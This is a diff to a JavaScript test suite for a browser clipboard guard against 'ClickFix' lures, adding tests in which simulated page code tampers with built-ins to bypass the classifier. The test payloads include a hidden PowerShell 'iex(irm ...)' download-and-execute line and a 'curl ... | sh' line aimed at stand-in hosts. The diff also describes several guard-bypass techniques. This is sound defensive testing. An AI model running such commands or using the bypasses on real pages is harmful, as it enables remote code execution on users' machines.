@@ -8,6 +8,7 @@
 //      and leave ordinary page text alone.
 import { readFile } from "node:fs/promises";
 import vm from "node:vm";
+import { scan } from "./live-region-scan.mjs";
 
 // Load clickfix-guard.js the way the browser does -- as a plain script against a
 // window -- and read its real classifier back out. Running the shipped file means
@@ -25,7 +26,8 @@ const BOOTSTRAP = `
   globalThis.__probe = { writeText: [], write: [], setData: [], execCommand: [] };
   // The sandbox realm's own intrinsics, so a test can tamper with the same
   // Array.prototype the guard and the stubs actually use.
-  globalThis.__realm = { Array, Object, Function, String, Reflect, Promise };
+  globalThis.__realm = { Array, Object, Function, String, Reflect, Promise,
+                         RegExp, Boolean, Date };
 
   globalThis.Blob = function Blob(text) { this.__text = String(text); };
   Blob.prototype.text = function () { return Promise.resolve(this.__text); };
@@ -63,6 +65,31 @@ const BOOTSTRAP = `
   Document.prototype.execCommand = function (command) {
     __probe.execCommand.push(command);
     return true;
+  };
+
+  // An input shaped like the real thing: its value lives in an internal slot
+  // behind a prototype accessor, as in Chromium, so an own property can shadow it
+  // for anyone who reads it by name while the "browser" still sees the real text.
+  // Without this the guard falls back to reading active.value directly and the
+  // shadowing test passes vacuously -- it did, the first time it was written.
+  const INPUT_VALUE = new WeakMap();
+  globalThis.HTMLInputElement = function HTMLInputElement() {};
+  Object.defineProperty(HTMLInputElement.prototype, "value", {
+    configurable: true,
+    get() {
+      // Real WebIDL accessors throw on a receiver without the internal slot, and
+      // that throw is how readCopySource recognises the wrong element type. A
+      // stub that returns "" instead answers for every object and would make the
+      // guard classify empty text for anything focused.
+      if (!INPUT_VALUE.has(this)) throw new TypeError("Illegal invocation");
+      return INPUT_VALUE.get(this);
+    },
+    set(v) { INPUT_VALUE.set(this, String(v)); }
+  });
+  globalThis.__makeInput = function (v) {
+    const el = new HTMLInputElement();
+    INPUT_VALUE.set(el, v);
+    return el;
   };
 
   navigator.clipboard = new Clipboard();
@@ -311,20 +338,56 @@ const check = (name, condition, detail = "") => {
   // --- captured intrinsics -------------------------------------------------
   // The guard's own tooling must not be page-replaceable. Nothing after the
   // capture block may look an intrinsic up by name at call time.
-  const afterCapture = guardSrc.split("const toPrimitiveString")[1] || "";
-  const stripComments = (t) => t.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
-  const live = stripComments(afterCapture);
-  for (const [label, re] of [
-    ["Function.prototype.call", /native[A-Za-z]*\.call\(/],
-    ["Object.defineProperty", /Object\.defineProperty\(/],
-    ["Object.getOwnPropertyDescriptor", /Object\.getOwnPropertyDescriptor\(/],
-    ["Object.getPrototypeOf", /Object\.getPrototypeOf\(/],
-    ["Promise.resolve", /Promise\.resolve\(/],
-    ["String", /[^a-zA-Z.]String\(/]
-  ]) {
-    check(`no call-time lookup of ${label} after the capture block`, !re.test(live),
-      (live.match(re) || [""])[0]);
-  }
+  // An ALLOWLIST, not a denylist. Rounds five and six asserted that six NAMED
+  // intrinsics do not appear after the capture block. That test passed while
+  //
+  //   countMatches = (text, patterns) => patterns.reduce((n, re) => ... re.test(text) ...)
+  //
+  // sat in the classifier core, where Array.prototype.reduce = () => 0 or
+  // RegExp.prototype.test = () => false zeroes every token count and makes
+  // decide() return "allow" on all four hook paths at once. A denylist can only
+  // catch the names someone already thought of, which is the wrong shape for a
+  // blind spot that has now recurred seven times. Every bare call in the live
+  // region must be a local or a captured native, and every method call must be
+  // on the reviewed list in live-region-scan.mjs.
+  const scanned = scan(guardSrc);
+  const live = scanned.live;
+  check("no call-time global lookups in the live region",
+    scanned.bare.length === 0, scanned.bare.join(" "));
+  check("no method calls outside the reviewed set in the live region",
+    scanned.methods.length === 0, scanned.methods.join(" "));
+
+  // The scan's own controls, in the suite rather than beside it. Three separate
+  // tests in this file have passed with the fix removed; a source scan that
+  // quietly stops seeing part of the file is the same failure with no symptom,
+  // and an earlier regex-based version of this scanner did exactly that -- a "/"
+  // in comment prose opened a phantom regex literal that swallowed the next
+  // three function declarations.
+  const ANCHOR = "  const countMatches = (text, patterns) => {";
+  check("the live-region scan reads the whole region",
+    guardSrc.includes(ANCHOR) &&
+    /(?:const|function)\s+intercept\b/.test(live) &&
+    /(?:const|function)\s+showWarning\b/.test(live) &&
+    /(?:const|function)\s+readCopySource\b/.test(live),
+    "declarations missing from the scanned region");
+  check("the live-region scan flags an injected global lookup", (() => {
+    const dirty = guardSrc.replace(ANCHOR,
+      "  const sniff = (x) => Boolean(x.reduce((a) => a, 0));\n" + ANCHOR);
+    const r = scan(dirty);
+    return r.bare.includes("Boolean") && r.methods.includes("reduce");
+  })());
+  check("the live-region scan ignores comments, strings and regex literals", (() => {
+    const dirty = guardSrc.replace(ANCHOR,
+      "  // trailing note mentioning x.reduce() and Boolean(y)\n" +
+      '  const s1 = "x.reduce() Boolean(y)";\n' +
+      "  const s2 = /x\\.reduce\\(\\)/i;\n" + ANCHOR);
+    const r = scan(dirty);
+    // Compare against the baseline, not against zero: asserting zero made this
+    // check fail spuriously in every control run where the guard already had a
+    // real violation, which is a misleading signal from a test about noise.
+    return r.bare.length === scanned.bare.length &&
+      r.methods.length === scanned.methods.length;
+  })());
   check("forwarding uses a captured Reflect.apply", /nativeApply\(native, this/.test(guardSrc));
   check("the promise constructor and then are captured", /const NativePromise = Promise;/.test(guardSrc) &&
     /const nativeThen = Promise\.prototype\.then;/.test(guardSrc));
@@ -368,7 +431,7 @@ const check = (name, condition, detail = "") => {
   // --- behavioural: exercise the installed wrappers -------------------------
   // These drive the real wrappers against the platform stubs, so they test what
   // the guard DOES, not how it is written.
-  const { probe, ctx, click } = loaded;
+  const { probe, ctx, click, run } = loaded;
   const clipboard = ctx.navigator.clipboard;
 
   check("writeText wrapper is installed on the prototype",
@@ -570,6 +633,159 @@ const check = (name, condition, detail = "") => {
         blockedPayload);
       check("a replaced Object.defineProperty is inert: benign still forwarded",
         forwardedBenign);
+    }
+
+    // --- round 7: the classifier's own text processing ------------------
+    // These are the worst bypasses found in this file. Each is ONE assignment,
+    // needs no timing trick, and disarms all four hook paths at once by zeroing
+    // every token count, so decide() returns "allow".
+    {
+      const cases = [
+        ["Array.prototype.reduce", R.Array.prototype, "reduce", function () { return 0; }],
+        ["RegExp.prototype.test", R.RegExp.prototype, "test", function () { return false; }],
+        ["String.prototype.split", R.String.prototype, "split", function () { return []; }]
+      ];
+      for (let i = 0; i < cases.length; i += 1) {
+        const label = cases[i][0], holder = cases[i][1], name = cases[i][2];
+        const before = probe.writeText.length;
+        const real = holder[name];
+        holder[name] = cases[i][3];
+        try {
+          click();
+          await clipboard.writeText('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
+        } finally { holder[name] = real; }
+        check(`a replaced ${label} cannot zero the classifier`,
+          probe.writeText.length === before,
+          `native received ${JSON.stringify(probe.writeText[probe.writeText.length - 1])}`);
+      }
+    }
+
+    // Boolean is a page-replaceable GLOBAL, and clipboard.write used it to decide
+    // whether an item carried text. Boolean = () => false made that false for
+    // every item, so the sequence was forwarded unclassified.
+    {
+      const before = probe.write.length;
+      run("globalThis.Boolean = function () { return false; };");
+      try {
+        click();
+        await clipboard.write(R.Array.of(new ctx.ClipboardItem({
+          "text/plain": 'powershell -w hidden -nop -c "iex(irm http://x.tld/a)"'
+        })));
+      } finally { run("globalThis.Boolean = __realm.Boolean;"); }
+      check("a replaced Boolean cannot make an item look text-free",
+        probe.write.length === before,
+        `forwarded ${probe.write.length - before} write(s) unclassified`);
+    }
+
+    // Date.now decides whether a click counts as a user gesture, and a forged
+    // gesture turns the command-shaped verdict from "block" into "warn", which
+    // forwards. This payload is command-shaped but carries no stealth or lure
+    // token, so the gesture is the ONLY thing between block and warn.
+    {
+      // A FRESH guard: this suite shares one loaded instance, and an earlier
+      // click() leaves the real gesture window open, in which case the payload is
+      // correctly only warned about and forwarded. Asserting a block against a
+      // genuinely-recent click tests nothing about Date.now.
+      const fresh = await loadGuard();
+      const freshRealm = fresh.ctx.__realm;
+      const realNow = freshRealm.Date.now;
+      // Near zero, not far in the future: the window is
+      // Date.now() - lastClickAt < 1500 and lastClickAt starts at 0, so a large
+      // constant makes the delta enormous and no gesture is seen. The first
+      // version of this test used 1e12 and therefore could not fail.
+      freshRealm.Date.now = function () { return 0; };
+      try {
+        // No click() on this instance, so nothing was ever activated.
+        await fresh.ctx.navigator.clipboard.writeText(
+          "curl -fsSL https://example.com/install.sh | sh");
+      } finally { freshRealm.Date.now = realNow; }
+      check("a replaced Date.now cannot forge the user gesture",
+        fresh.probe.writeText.length === 0,
+        `native received ${JSON.stringify(fresh.probe.writeText[0])}`);
+    }
+
+    // execCommand("copy") read activeElement.value by NAME, so an own property
+    // shadowed the real getter: the guard classified the page's string while the
+    // browser copied the live selection from internal slots.
+    {
+      const before = probe.execCommand.length;
+      const input = ctx.__makeInput('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
+      R.Object.defineProperty(input, "value", { get() { return "harmless text"; } });
+      ctx.document.activeElement = input;
+      click();
+      const ret = ctx.document.execCommand("copy");
+      ctx.document.activeElement = null;
+      check("an own value getter cannot hide what execCommand will copy",
+        ret === false && probe.execCommand.length === before,
+        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
+    }
+
+    // The same read, attacked at the prototype instead of the instance.
+    {
+      const before = probe.execCommand.length;
+      const input = ctx.__makeInput('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
+      const realDesc = R.Object.getOwnPropertyDescriptor(ctx.HTMLInputElement.prototype, "value");
+      R.Object.defineProperty(ctx.HTMLInputElement.prototype, "value", {
+        configurable: true, get() { return "harmless text"; }
+      });
+      let ret;
+      try {
+        ctx.document.activeElement = input;
+        click();
+        ret = ctx.document.execCommand("copy");
+      } finally {
+        R.Object.defineProperty(ctx.HTMLInputElement.prototype, "value", realDesc);
+        ctx.document.activeElement = null;
+      }
+      check("a replaced input value getter cannot hide what execCommand will copy",
+        ret === false && probe.execCommand.length === before,
+        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
+    }
+
+    // A replaced toLowerCase made the guard decide the command was not "copy".
+    {
+      const before = probe.execCommand.length;
+      const real = R.String.prototype.toLowerCase;
+      R.String.prototype.toLowerCase = function () { return "notcopy"; };
+      let ret;
+      try {
+        ctx.document.activeElement = ctx.__makeInput('powershell -w hidden -nop -c "iex(irm http://x.tld/a)"');
+        click();
+        ret = ctx.document.execCommand("copy");
+      } finally {
+        R.String.prototype.toLowerCase = real;
+        ctx.document.activeElement = null;
+      }
+      check("a replaced toLowerCase cannot make a copy look like another command",
+        ret === false && probe.execCommand.length === before,
+        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
+    }
+
+    // A hostile activeElement getter. Reading the copy source is the one step that
+    // genuinely can throw on a page's terms, and the old copy branch answered a
+    // throw by falling through to the native. For a copy command a throw is
+    // anomalous, so it must refuse instead.
+    {
+      const before = probe.execCommand.length;
+      const realDesc = R.Object.getOwnPropertyDescriptor(ctx.document, "activeElement");
+      R.Object.defineProperty(ctx.document, "activeElement", {
+        configurable: true,
+        get() { throw new Error("hostile activeElement"); }
+      });
+      let ret;
+      try {
+        click();
+        ret = ctx.document.execCommand("copy");
+      } finally {
+        if (realDesc) R.Object.defineProperty(ctx.document, "activeElement", realDesc);
+        else {
+          delete ctx.document.activeElement;
+          ctx.document.activeElement = null;
+        }
+      }
+      check("a throwing activeElement getter makes the copy fail closed",
+        ret === false && probe.execCommand.length === before,
+        `returned ${ret}, forwarded ${probe.execCommand.length - before}`);
     }
 
     // Promise interception. `await p` on a page-reachable promise is NOT a plain
